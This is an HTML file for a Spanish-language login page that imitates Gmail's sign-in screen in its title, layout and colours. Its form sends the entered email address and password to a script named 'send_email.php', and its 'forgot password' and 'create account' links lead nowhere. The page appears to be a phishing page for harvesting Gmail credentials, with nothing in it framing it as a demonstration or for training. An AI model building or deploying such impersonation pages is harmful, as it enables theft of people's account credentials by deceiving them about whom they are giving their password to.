<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Iniciar sesión - Gmail</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 8px;
            padding: 36px 24px;
            width: 360px;
            box-shadow: 0px 0px 24px rgba(0, 0, 0, 0.15);
            text-align: center;
        }

        h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 24px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            margin: 12px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #4285f4;
            box-shadow: 0px 0px 0px 2px rgba(66, 133, 244, 0.3);
        }

        .login-btn {
            background-color: #4285f4;
            color: white;
            padding: 14px 16px;
            width: 100%;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 16px;
            outline: none;
        }

        .login-btn:hover {
            background-color: #3367d6;
        }

        .forgot-password {
            display: block;
            margin-top: 16px;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .create-account {
            margin-top: 24px;
            font-size: 14px;
            color: #5f6368;
        }

        .create-account a {
            color: #1a73e8;
            text-decoration: none;
        }

        .create-account a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Iniciar sesión</h1>

    <!-- Formulario para enviar los datos a PHP -->
    <form action="send_email.php" method="POST">
        <input type="email" name="email" placeholder="Correo electrónico" required>
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit" class="login-btn">Iniciar sesión</button>
    </form>

    <a href="#" class="forgot-password">¿Olvidaste la contraseña?</a>

    <div class="create-account">
        <p>¿No tienes cuenta? <a href="#">Crear cuenta</a></p>
    </div>
</div>

</body>
</html>
